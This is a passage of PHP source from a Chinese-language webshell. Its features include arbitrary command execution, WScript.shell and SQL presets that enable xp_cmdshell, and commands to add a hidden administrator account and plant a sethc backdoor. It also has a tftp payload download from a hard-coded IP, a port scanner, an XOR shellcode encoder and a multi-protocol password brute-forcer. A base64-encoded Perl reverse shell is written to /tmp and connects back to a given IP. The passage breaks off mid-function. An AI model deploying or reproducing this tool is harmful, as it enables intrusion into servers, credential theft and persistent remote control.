if(!empty($_POST['sp'])) { if($_POST['st'] == 'php'){$features_all = $features_php; $st = '\.php|\.inc|\.php4|\.php3|\._hp|\;';} if($_POST['st'] == 'asx'){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\.cdx|\;';} if($_POST['st'] == 'ppp'){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.php4|\.php3|\._hp|\.asp|\.asa|\.cer|\.cdx|\.aspx|\.ascx|\;';} echo Antivirus_Auto($_POST['sp'],$features_all,$st) ? '成功' : '失败'; } echo '</div>'; return true; } function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb) { if(($h_d = @opendir($sfp)) == NULL) return false; while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' || $Filename == '..') continue; if(eregi($sft,$Filename)) continue; $Filepath = File_Str($sfp.'/'.$Filename); if(is_dir($Filepath) && $sfb) Findfile_Auto($Filepath,$sfc,$sft,$sff,$sfb); if($sff) { if(stristr($Filename,$sfc)) { echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n"; ob_flush(); flush(); } } else { $File_code = File_Read($Filepath); if(stristr($File_code,$sfc)) { echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n"; ob_flush(); flush(); } } } @closedir($h_d); return true; } function Findfile_j() { if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '<font style=font:11pt color=ff0000>删除成功</font>';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '<font style=font:11pt color=ff0000>删除成功</font>' : '<font style=font:11pt color=ff0000>删除失败</font>';} return false;} if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; } $SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode(); $SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config'; $SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip'; print<<<END
<form method="POST" name="jform" id="jform" action="?s=u">
<div class="actall">扫描路径 <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">&nbsp过滤文件&nbsp <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
<div class="actall">关键字串 <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>搜索文件名 
<input type="radio" name="sff" value="b">搜索包含关键字</div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>将搜索应用于该文件夹,子文件夹和文件 

<br><input type="radio" name="sfb" value="b">仅将搜索应用于该文件夹</div>
<div class="actall"><input class="bt" type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
if((!empty($_POST['sfp'])) && (!empty($_POST['sfc']))) { echo '<div class="actall">'; $_POST['sft'] = str_replace('.','\\.',$_POST['sft']); $sff = ($_POST['sff'] == 'a') ? true : false; $sfb = ($_POST['sfb'] == 'a') ? true : false; echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '<font style=font:11pt color=ff0000>成功</font>' : '<font style=font:11pt color=ff0000>Error</font>'; echo '</div>'; } return true; } function filecollect($dir,$filelist) { $files = ftp_nlist($conn,$dir); return $files; } function ftp_php(){ $dir = ""; $ftphost = isset($_POST['ftphost']) ? $_POST['ftphost'] : '127.0.0.1'; $ftpuser = isset($_POST['ftpuser']) ? $_POST['ftpuser'] : 'root'; $ftppass = isset($_POST['ftppass']) ? $_POST['ftppass'] : 'root'; $ftplist = isset($_POST['list']) ? $_POST['list'] : ''; $ftpfolder = isset($_POST['ftpfolder']) ? $_POST['ftpfolder'] : '/'; $ftpfolder = strtr($ftpfolder,"\\","/"); $files = isset($_POST['readfile']) ? $_POST['readfile'] : ''; print<<<END
<br><br><div class="actall"><h5>用PHP链接ftp服务</h5><br></div>
<form method="POST" name="" action=""><br>
<div class="actall">主机:<input type="text" name="ftphost" value="{$ftphost}" style="width:100px">
用户:<input type="text" name="ftpuser" value="{$ftpuser}" style="width:100px">
密码:<input type="text" name="ftppass" value="{$ftppass}" style="width:100px"><br><br>
<input type="hidden" name="readfile" value="" style="width:200px">
文件夹:<input type="text" name="ftpfolder" value="{$ftpfolder}" style="width:200px">
<input type="hidden" name="list" value="list">
<input class="bt" type="submit" name="list" value="浏览" style="width:40px"><br><br></form></div>
END;
if($ftplist == 'list'){ $conn = @ftp_connect($ftphost) or die("不能链接ftp服务"); if(@ftp_login($conn,$ftpuser,$ftppass)){ $filelists = @ftp_nlist( $conn, $ftpfolder ); echo "<pre>"; echo "当前目录是 <font color='#FF0000'>$ftpfolder</font>:<br>"; if(is_array($filelists)) { foreach ($filelists as $file) { $file = strtr($file,"\\","/"); $size_file =@ftp_size($conn, $file); if ( $size_file == -1) { $a=$a.basename($file)."<br>"; } else { $b=$b.basename($file)."				".$size_file."B</br>"; } } } echo $a; echo $b; echo "</pre>"; } } print<<<END
<form method="POST" name="" action="" >
<div class="actall">文件名:<input type="text" name="readfile" value="{$files}" style="width:200px">
<input type="hidden" name="read" value="read">
<input class="bt" type="submit" name="read" value="读取" style="width:40px"><br><br></form></div>
END;
$readaction = isset($_POST['read']) ? $_POST['read'] : ''; if ($readaction == 'read') { $handle = @file_get_contents("ftp://$ftpuser:$ftppass@$ftphost/$files", "r"); $handle = htmlspecialchars($handle); $handle = str_replace("\n", "<br>", $handle); echo "<font color='#FF0000'>$files</font> 内容是:<br><br>"; echo $handle; } print<<<END
<form method="post" enctype="multipart/form-data" name="" action="">
<div class="actall">文件夹:<input type="text" name="cdir" value="{$cdir}" style="width:100px">
<input type="file" name="upload" value="upload" style="width:200px;height:22px;">
<input type="hidden" name="upfile" value="upfile">
<input class="bt" type="submit" name="submit" value="上传" style="width:40px"><br><br></form></div>
END;
$upaction = isset($_POST['upfile']) ? $_POST['upfile'] : '' ; if ($upaction == 'upfile') { $cdir = isset($_POST['cdir']) ? $_POST['cdir'] : '/'; $conn = @ftp_connect($ftphost) or die("不能链接ftp服务"); if(@ftp_login($conn,$ftpuser,$ftppass)){ @ftp_chdir($conn, $cdir); $res_code = @ftp_put($conn,$_FILES['upload']['name'],$_FILES['upload']['tmp_name'], FTP_BINARY,0); if (empty($res_code)){ echo '<font color="#FF67A0">ftp上传失败</font><br>'; } else{ echo '<font color="#FF67A0">ftp上传成功</font><br>'; } } } print<<<END
<form method="POST" enctype="multipart/form-data" name="" action="">
<div class="actall">文件路径:<input type="text" name="downfile" value="{$getfile}" style="width:100px">
<input type="hidden" name="getfile" value="down">
<input class="bt" type="submit" name="down" value="下载" style="width:40px"><br><br></form></div>
END;
$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = isset($_POST['getfile']) ? $_POST['getfile'] : ''; if ($getaction == 'down' && $getfile !=''){ function php_ftp_download($filename){ global $ftphost,$ftpuser,$ftppass; $ftp_path = dirname($filename) . "/"; $select_file = basename($filename); $ftp = @ftp_connect($ftphost); if($ftp){ if(@ftp_login($ftp, $ftpuser, $ftppass)){ if(@ftp_chdir($ftp,$ftp_path)) { $tmpfile = tempnam(getcwd(),"temp"); if(ftp_get($ftp,$tmpfile,$select_file,FTP_BINARY)){ ftp_quit($ftp); header("Content-Type:application/octet-stream"); header("Content-Disposition:attachment;  filename=" . $select_file); unlink($tmpfile); exit; } } } } ftp_quit($ftp); } php_ftp_download($getfile); } } function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}} function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";} function Info_f() { $dis_func = get_cfg_var("disable_functions"); $upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "upfile forbidden"; $adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>"; if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);} $phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No"; $info = array( array("服务器时间",date("Y-m-d h:i:s",time())), array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"), array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])), array("服务器操作系统",PHP_OS), array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']), array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']), array("你的IP",getenv('REMOTE_ADDR')), array("Web服务端口",$_SERVER['SERVER_PORT']), array("PHP运行方式",strtoupper(php_sapi_name())), array("PHP版本",PHP_VERSION), array("运行于安全模式",Info_Cfg("safemode")), array("服务器管理员",$adminmail), array("本文件路径",__FILE__), array("允许使用 URL 打开文件 allow_url_fopen",Info_Cfg("allow_url_fopen")), array("允许动态加载链接库 enable_dl",Info_Cfg("enable_dl")), array("显示错误信息 display_errors",Info_Cfg("display_errors")), array("自动定义全局变量 register_globals",Info_Cfg("register_globals")), array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")), array("程序最多允许使用内存量 memory_limit",Info_Cfg("memory_limit")), array("POST最大字节数 post_max_size",Info_Cfg("post_max_size")), array("允许最大上传文件 upload_max_filesize",$upsize), array("程序最长运行时间 max_execution_time",Info_Cfg("max_execution_time")."second"), array("被禁用的函数 disable_functions",$dis_func), array("phpinfo()",$phpinfo), array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'), array("图形处理 GD Library",Info_Fun("imageline")), array("IMAP电子邮件系统",Info_Fun("imap_close")), array("MySQL数据库",Info_Fun("mysql_close")), array("SyBase数据库",Info_Fun("sybase_close")), array("Oracle数据库",Info_Fun("ora_close")), array("Oracle 8 数据库",Info_Fun("OCILogOff")), array("PREL相容语法 PCRE",Info_Fun("preg_match")), array("PDF文档支持",Info_Fun("pdf_close")), array("Postgre SQL数据库",Info_Fun("pg_close")), array("SNMP网络管理协议",Info_Fun("snmpget")), array("压缩文件支持(Zlib)",Info_Fun("gzclose")), array("XML解析",Info_Fun("xml_set_object")), array("FTP",Info_Fun("ftp_login")), array("ODBC数据库连接",Info_Fun("odbc_close")), array("Session支持",Info_Fun("session_start")), array("Socket支持",Info_Fun("fsockopen")), ); echo '<table width="100%" border="0">'; for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";} echo '</table>'; return true; } function Exec_Run($cmd) { $res = ''; if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);} elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);} elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();} elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();} elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);} return $res; } function Exec_g() { echo '<br>'; $res = '回显窗口'; $cmd = 'dir'; if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];} print<<<END
<script language="javascript">
function sFull(i){
	Str = new Array(11);
	Str[0] = "ver";
        Str[1] = "path";
        Str[2] = "ipconfig /all";
        Str[3] = "whoami";
        Str[4] = "tasklist /svc";
        Str[5] = "netstat -an";
        Str[6] = "systeminfo";
	Str[7] = "net user";
        Str[8] = "net view";
        Str[9] = "net config workstation";
        Str[10] = "net config server";
	Str[11] = "net user b4che10r b4che10r /add & net localgroup administrators b4che10r /add";
	Str[12] = "query user";
	Str[13] = "copy c:\\1.php d:\\2.php";
        Str[14] = "copy c:\\windows\\explorer.exe c:\\windows\\system32\\sethc.exe & copy c:\\windows\\system32\\sethc.exe c:\\windows\\system32\\dllcache\\sethc.exe";
	Str[15] = "tftp -i 219.134.46.245 get server.exe c:\\\\server.exe";
        Str[16] = "ps -ef";
        Str[17] = "ifconfig";
        Str[18] = "cat /etc/syslog.conf";
        Str[19] = "cat /etc/my.cnf";
        Str[20] = "cat /etc/hosts";
        Str[21] = "cat /etc/services";
	document.getElementById('cmd').value = Str[i];
	return true;
}
</script>
<div class="actall"><form method="POST" name="gform" id="gform" action="?s=g">
命令参数: <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:369px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>----命令集合----</option>
<option value="1">path(win)</option>
<option value="2">ipconfig(win)</option>
<option value="3">whoami(win)</option>
<option value="4">tasklist(win)</option>
<option value="5">netstat -an</option>
<option value="6">systeminfo(win)</option>
<option value="7">net user(win)</option>
<option value="8">net view(win)</option>
<option value="9">net config workstation(win)</option>
<option value="10">net config server(win)</option>
<option value="11">add administrators(win)</option>
<option value="12">query user(win)</option>
<option value="13">复制文件(win)</option>
<option value="14">shift 后门(win)</option>
<option value="15">FTP 下载(win)</option>
<option value="16">ps(linux)</option>
<option value="17">ifconfig(linux)</option>
<option value="18">syslog.conf(linux)</option>
<option value="19">my.cnf(linux)</option>
<option value="20">hosts(linux)</option>
<option value="21">services(linux)</option>

</select>
<input class="bt" type="submit" value="执行" ></div>
<div class="actall"><textarea name="show" style="width:720px;height:450px;">{$res}</textarea></div>
</form>
END;
return true; } function Com_h() { $object = isset($_GET['o']) ? $_GET['o'] : 'adodb'; $com = array("adodb" => "ADODB.Connection","wscript" => "WScript.shell","application" => "Shell.Application"); print<<<END
<div class="actall"><a href="?s=h&o=adodb">[ADODB.Connection]</a> 
<a href="?s=h&o=wscript">[WScript.shell]</a> 
<a href="?s=h&o=application">[Shell.Application]</a></div>
<div class="actall" style="height:200px;">
<form method="POST" name="hform" id="hform" action="?s=h&o={$object}"><br>
END;
$shell = new COM($com[$object]); if($object == 'wscript') { $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir'; $cmdpath = isset($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\windows\\system32\\cmd.exe'; print<<<END
&nbspcmd路径:<input type="text" name="cmdpath" value="{$cmdpath}" style="width:600px;"><br>
&nbspcmd命令:<input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<input class="bt" type="submit" value="执行"></form><br>
END;
if(!empty($_POST['cmd'])) { $exe = @$shell->exec("$cmdpath /c ".$cmd); $out = $exe->StdOut(); $output = $out->ReadAll(); echo '<pre>'.$output.'</pre>'; } } elseif($object == 'application') { $run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe'; $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\windows\php.ini c:\php.ini'; print<<<END
程序路径:<br><input type="text" name="run" value="{$run}" style="width:600px;">
<br><br>命令参数:<br><input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<br><br><input class="bt" type="submit" value="执行"></form><br>
END;
if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '成功' : 'Faild'; } elseif($object == 'adodb') { $string = isset($_POST['string']) ? $_POST['string'] : ''; $sql = isset($_POST['sql']) ? $_POST['sql'] : ''; print<<<END
<script language="javascript">
function hFull(i){
	if(i==0 || i==10) return false;
	Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb;Jet OLEDB:Database Password=***";
	Str[2] = "Driver={Sql Server};Server=localhost,1433;Database=DbName;Uid=sa;Pwd=sa";
	Str[3] = "Driver={MySql};Server=localhost;Port=3306;Database=DbName;Uid=root;Pwd=root";
	Str[4] = "Provider=OraOLEDB.Oracle.1;User ID=oracle;Password=oracle;Data Source=ORACLE;Persist Security Info=True;";
        Str[5] = "driver={IBM db2 odbc DRIVER};database=mydb;hostname=localhost;port=50000;protocol=TCPIP;uid=root; pwd=pass";
        Str[6] = "DRIVER={POSTGRESQL};SERVER=127.0.0.1;DATABASE=PostGreSQL;UID=postgresql;PWD=123456;";
        Str[7] = "Dsn='';Driver={INFORMIX 3.30 32 BIT};Host=myHostname;Server=myServerName;Service=myServiceName;Protocol=olsoctcp;Database=myDbName;UID=myUsername;PWD=myPassword";
	Str[8] = "DSN=mydns;Uid=username;Pwd=password";
        Str[9] = "FILEDNS=c:\\\path\\\db.dsn;Uid=username;Pwd=password";
        Str[11] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[12] = "INSERT INTO [TableName](USER,PASS) VALUES('b4che10r','mypass')";
	Str[13] = "UPDATE [TableName] SET USER='b4che10r' WHERE ID=100";
	Str[14] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[15] = "DROP TABLE [TableName]";
	Str[16] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
        Str[17] = "select shell('c:\windows\system32\cmd.exe /c net user b4che10r abc123 /add');";
        Str[18] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
        Str[19] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;";
        Str[20] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;";
        Str[21] = "Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')";
        Str[22] = "Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll')";
        Str[23] = "Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?php phpinfo();?>' > c:\info.php';";
	Str[24] = "sp_makewebtask @outputfile='d:\\\web\\\test.php',@charset=gb2312,@query='select test';";
        Str[25] = "Exec master.dbo.xp_cmdshell 'ver';";
        Str[26] = "Select Name FROM Master..SysDatabases;";
        Str[27] = "select name from sysobjects where type='U';";
        Str[28] = "Select Name from SysColumns Where id=Object_Id('TableName');";
        Str[29] = "select username,password from dba_users;";
        Str[30] = "select TABLE_NAME from all_tables;";
        Str[31] = "desc admin;";
        Str[32] = "grant connect,resource,dba to user_name;";
        Str[33] = "select datname from pg_database;";
        Str[34] = "select relname from pg_stat_user_tables;";
        Str[35] = "\\\d table_name";
        Str[36] = "select pg_file_read('pg_hba.conf',1,pg_file_length('pg_hb.conf'));";
        Str[37] = "\\\! uname -a";
        Str[38] = "select schemaname from syscat.schemata;";
        Str[39] = "select name from sysibm.systables;";
        Str[40] = "select colname from syscat.columns where tabname='table_name';";
        Str[41] = "db2 get db cfg for db_name;";
        Str[42] = "select name from sysdatabases;";
        Str[43] = "select tabname from systables where tabid=n;";
        Str[44] = "select tabname,colname,owner,coltype from syscolumns join systables on syscolumns.tabid = systables.tabid;";
        Str[45] = "select username,usertype,password from sysusers;";
        if(i<=9){document.getElementById('string').value = Str[i];}else{document.getElementById('sql').value = Str[i];}
	return true;
}
</script>
连接字符串:<br> <input type="text" name="string" id="string" value="{$string}" style="width:800px;">
<select onchange="return hFull(options[selectedIndex].value)">
<option value="0" selected>--链接实例--</option>
<option value="1">Access连接</option>
<option value="2">MsSql连接</option>
<option value="3">MySql连接</option>
<option value="4">Oracle连接</option>
<option value="5">DB2连接</option>
<option value="6">PostGreSQL连接</option>
<option value="7">Informix连接</option>
<option value="8">DSN连接</option>
<option value="9">FILEDSN连接</option>
<option value="10">--sql语句--</option>
<option value="11">显示数据</option>
<option value="12">插入数据</option>
<option value="13">修改数据</option>
<option value="14">创建表</option>
<option value="15">删除表</option>
<option value="16">增加字段</option>
<option value="17">access shell()</option>
<option value="18">add xp_cmdsehll(sql2005)</option>
<option value="19">add oacreate(sql2005)</option>
<option value="20">add openrowset(sql2005)</option>
<option value="21">add xp_cmdsehll(sql2000)</option>
<option value="22">add oacreate(sql2000)</option>
<option value="23">oamethod exec</option>
<option value="24">sp_makewebtask</option>
<option value="25">xp_cmdshell</option>
<option value="26">databases(sql)</option>
<option value="27">tables(sql)</option>
<option value="28">columns(sql)</option>
<option value="29">hashes(oracle)</option>
<option value="30">tables(oracle)</option>
<option value="31">columns(oracle)</option>
<option value="32">grant(oracle)</option>
<option value="33">databases(pgsql)</option>
<option value="34">tables(pgsql)</option>
<option value="35">columns(pgsql)</option>
<option value="36">pg_hba.conf(pgsql)</option>
<option value="37">os-command(pgsql)</option>
<option value="38">databases(db2)</option>
<option value="39">tables(db2)</option>
<option value="40">columns(db2)</option>
<option value="41">db config(db2)</option>
<option value="42">databases(informix)</option>
<option value="43">tables(informix)</option>
<option value="44">columns(informix)</option>
<option value="45">hashes(informix)</option>
</select>
<br><br>SQL命令:<br> <input type="text" name="sql" id="sql" value="{$sql}" style="width:800px;">
<input class="bt" type="submit" value="执行">
</form><br>
END;
if(!empty($string)) { @$shell->Open($string); $result = @$shell->Execute($sql); $count = $result->Fields->Count(); for($i=0;$i < $count;$i++){$Field[$i] = $result->Fields($i);} echo $result ? $sql.' 成功<br>' : $sql.' Faild<br>'; if(!empty($count)){while(!$result->EOF){for($i=0;$i < $count;$i++){echo $Field[$i]->value.'<br>';}@$result->MoveNext();}} $shell->Close(); } } $shell = NULL; echo '</div>'; return true; } function Port_i() { print<<<END
<div class="actall" style="height:200px;">
<form method="POST" name="iform" id="iform" action="?s=i">
扫描 IP<br><input type="text" name="ip" value="127.0.0.1" style="width:600px;">
<br><br>端  口<br><input type="text" name="port" value="21|22|1433|1521|3306|3389|4899|5432|5631|5800|8000|8080|43958" style="width:600px;">
<br><br> <input class="bt" type="submit" value="开始扫描">
</form><br>
END;
if((!empty($_POST['ip'])) && (!empty($_POST['port']))) 
{
 $ports = explode('|',$_POST['port']); 
for($i = 0;$i < count($ports);$i++) 
{ 
$fp = @fsockopen($_POST['ip'],$ports[$i],$errno,$errstr,1); 
echo $fp ? '<font color="#FF0000">开放端口 ---> '.$ports[$i].'</font><br>' : '关闭端口 ---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_value) { $Oday_value = hexdec($Oday_value); $$Url_String = str_replace(" ", "", $Url_String); $SHELL = explode("%u", $Url_String); for($i=0;$i < count($SHELL);$i++) { $Temp = $SHELL[$i]; $s_1 = substr($Temp,2); $s_2 = substr($Temp,0,2); $COPY .= $s_1.$s_2; } for($n=0; $n < strlen($COPY); $n+=2){$Decode .= pack("C", hexdec(substr($COPY, $n, 2) )^ $Oday_value);} return $Decode; } function shellcode_encode($Url_String,$Oday_value) { $Length =strlen($Url_String); $Todec = hexdec($Oday_value); for ($i=0; $i < $Length; $i++) { $Temp = ord($Url_String[$i]); $Hex_Temp = dechex($Temp ^ $Todec); if (hexdec($Hex_Temp) < 16) $Hex_Temp = '0'.$Hex_Temp; $hex .= $Hex_Temp; } if ($Length%2) $hex .= $Oday_value.$Oday_value; else $hex .= $Oday_value.$Oday_value.$Oday_value.$Oday_value; for ($n=0; $n < strlen($hex); $n+=4) { $Temp = substr($hex, $n, 4); $s_1= substr($Temp,2); $s_2= substr($Temp,0,2); $Encode.= '%u'.$s_1.$s_2; } return $Encode; } function shellcode_findxor($Url_String) { for ($i = 0; $i < 256; $i++) { $shellcode[0] = shellcode_decode($Url_String, dechex($i)); if ((strpos ($shellcode[0],'tp:')) || (strpos ($shellcode[0],'url')) || (strpos ($shellcode[0],'exe'))) { $shellcode[1] = dechex($i); return $shellcode; } } } function Shellcode_j() { $Oday_value = '0'; $Shell_Code = 'http://blog.taskkill.net/mm.exe'; $checkeda = ' checked'; $checkedb = ''; if(!empty($_POST['code'])) { if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);} if($_POST['xor'] == 'b'){$checkeda = '';$checkedb = ' checked';$Shell_Code_Array = shellcode_findxor($_POST['code']);$Shell_Code = $Shell_Code_Array[0];$Oday_value = $Shell_Code_Array[1];} if(!$Oday_value) $Oday_value = '0'; if(!$Shell_Code) $Shell_Code = '不能发现shellcode现在链接'; $Shell_Code = htmlspecialchars($Shell_Code); } print<<<END
<form method="POST" name="jform" id="jform" action="?s=j">
<div class="actall">XOR值:<input name="number" value="{$Oday_value}" type="text" style="width:50px">&nbsp;&nbsp;&nbsp;
<input type="radio" name="xor" value="a"{$checkeda}>编码 shellcode with XOR <input type="radio" name="xor" value="b"{$checkedb}>解码 shellcode with XOR</div>
<div class="actall"><textarea name="code" rows="20" cols="165">{$Shell_Code}</textarea></div>
<div class="actall"><input class="bt" type="submit" value="转换"></div>
</form>
END;
return true; } function Crack_k() { $MSG_BOX = '等待消息队列......'; $ROOT_DIR = File_Mode(); $SORTS = explode('/',$ROOT_DIR); array_shift($SORTS); $PASS = join(',',$SORTS); for($i = 0;$i < 10;$i++){$n = (string)$i; $PASS .= $n.$n.$n.$n.$n.$n.','; $PASS .= $n.$n.$n.$n.$n.$n.$n.','; $PASS .= $n.$n.$n.$n.$n.$n.$n.$n.',';} if((!empty($_POST['address'])) && (!empty($_POST['user'])) && (!empty($_POST['pass']))) { $SORTPASS = explode(',',$_POST['pass']); $connect = false; $MSG_BOX = '没有发现'; for($k = 0;$k < count($SORTPASS);$k++) { if($_POST['class'] == 'mysql') $connect = @mysql_connect($_POST['address'],$_POST['user'],chop($SORTPASS[$k])); if($_POST['class'] == 'ftp'){$Ftp_conn = @ftp_connect($_POST['address'],'21');$connect = @ftp_login($Ftp_conn,$_POST['user'],chop($SORTPASS[$k]));} if($_POST['class'] == 'mssql') $connect = @mssql_connect($_POST['address'],$_POST['user'],chop($SORTPASS[$k])); if($_POST['class'] == 'pgsql') $connect = @pg_connect("host={$_POST['address']} port=5432 dbname=postgres user={$_POST['user']} password={chop($SORTPASS[$k])}"); if($_POST['class'] == 'oracle') $connect = @oci_connect($_POST['user'],chop($SORTPASS[$k]),$_POST['address']); if($_POST['class'] == 'ssh'){$ssh_conn = @ssh2_connect($_POST['address'],'22');$connect = @ssh2_auth_password($ssh_conn,$_POST['user'],chop($SORTPASS[$k]));} if($connect) $MSG_BOX = '[project: '.$_POST['class'].'] [ip: '.$_POST['address'].'] [user: '.$_POST['user'].'] [pass: '.$SORTPASS[$k].']'; } } print<<<END
<form method="POST" name="kform" id="kform" action="?s=k">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<div class="actall">主机 <input type="text" name="address" value="localhost" style="width:300px"></div>
<div class="actall">用户 <input type="text" name="user" value="root" style="width:300px"></div>
<div class="actall">密码 <textarea name="pass" rows="20" cols="165">{$PASS}root,123456,123123,123321,admin,admin888,admin@admin,root@root,qwer123,5201314,iloveyou,fuckyou,kissme,520520,5845201314,a123456,a123456789</textarea></div>
<div class="actall">破解项目: <input type="radio" name="class" value="mysql" checked>Mysql 
<input type="radio" name="class" value="ftp">FTP<input type="radio" name="class" value="mssql" checked>mssql<input type="radio" name="class" value="pgsql" checked>Pgsql<input type="radio" name="class" value="oracle" checked>Oracle<input type="radio" name="class" value="ssh" checked>SSH</div>
<div class="actall"><input class="bt" type="submit" value="开始爆破"></div></form>
END;
return true; } function Linux_l() { echo '<br><br>'; print<<<END
<div class="actall" style="height:100px;"><form method="POST" name="lform" id="lform" action="?s=l">
你的 IP: <input type="text" name="yourip" value="" style="width:200px">
你的 端口: <input type="text" name="yourport" value="1120" style="width:100px">
使用脚本: <select name="use" >
<option value="perl">perl</option>
<option value="python">python</option>
<option value="c">c</option>
</select>
<input class="bt" type="submit" value="连接"></form><br>
END;
if((!empty($_POST['yourip'])) && (!empty($_POST['yourport']))) { if($_POST['use'] == 'perl') { $back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; echo File_Write('/tmp/b4che10r_pl',base64_decode($back_connect_pl),'wb') ? '<font style=font:11pt color=ff0000>create /tmp/b4che10r_pl success</font><br>' : '<font style=font:11pt color=ff0000>create /tmp/b4che10r_pl faild</font><br>'; $perlpath = Exec_Run('which perl'); 